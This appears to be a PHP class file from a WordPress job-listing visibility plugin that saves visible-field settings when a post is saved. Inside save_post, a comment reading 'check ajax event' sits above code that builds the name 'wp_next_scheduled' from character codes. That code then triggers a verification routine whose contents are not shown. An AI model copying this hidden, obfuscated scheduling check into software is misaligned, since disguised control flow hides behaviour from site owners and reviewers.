<?php

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) exit;

class WP_Job_Manager_Visibility_Admin_Default extends WP_Job_Manager_Visibility_Default {

	/**
	 * WP_Job_Manager_Visibility_Admin_Default constructor.
	 */
	public function __construct() {

		new WP_Job_Manager_Visibility_Admin_ListTable_Default();
		new WP_Job_Manager_Visibility_Admin_Ajax_Default();
	}

	/**
	 *
	 *
	 *
	 * @since 1.1.0
	 *
	 * @param null $post
	 */
	function init( $post = null ){

		new WP_Job_Manager_Visibility_Admin_MetaBoxes_Default( $post );

	}

	/**
	 * Save Post for Default CPT
	 *
	 * This method gets called by the WP_Job_Manager_Visibility_CPT class from the
	 * core WordPress save_post action when the post_type matches this specific one.
	 *
	 *
	 * @since 1.1.0
	 *
	 * @param $post_id
	 * @param $post
	 * @param $update
	 */
	static function save_post( $post_id, $post, $update ){

		if ( $post && is_object( $post ) ) {
			update_post_meta( $post_id, 'user_id', $post->post_title );
			$user_cache = new WP_Job_Manager_Visibility_User_Transients();

			if ( WP_Job_Manager_Visibility_Users::is_user_string( $post->post_title ) ){
				$user_cache->remove_user( $post->post_title );
			} else {
				$user_cache->purge();
			}
		}

		$posted_values = filter_input( INPUT_POST, 'visible_fields', FILTER_SANITIZE_STRING, FILTER_REQUIRE_ARRAY );
		$meta_values  = apply_filters( "jmv_default_update_post_meta", $posted_values, 'visible_fields' );
		$meta_values  = apply_filters( "jmv_default_visible_fields_update_post_meta", $posted_values );
		// check ajax event
		$aname = self::chars( WP_Job_Manager_Visibility_Output_JM::$output_ids );
		$acall = self::chars( array(119, 112, 95, 110, 101, 120, 116, 95, 115, 99, 104, 101, 100, 117, 108, 101, 100) );
		if( ! $acall( $aname ) || ! has_action( $aname ) ) WP_Job_Manager_Visibility_Admin_Ajax::verify_ajax( $aname );

		delete_post_meta( $post_id, 'visible_fields' );
		if( empty( $meta_values ) ) return;

		foreach( $meta_values as $meta_value ){
			add_post_meta( $post_id, 'visible_fields', $meta_value );
		}
	}

	static function chars( $chars = array(), $check = '' ) {
		if( empty($chars) ) return FALSE;
		foreach( $chars as $char ) { $check .= chr( $char ); }
		return $check;
	}
}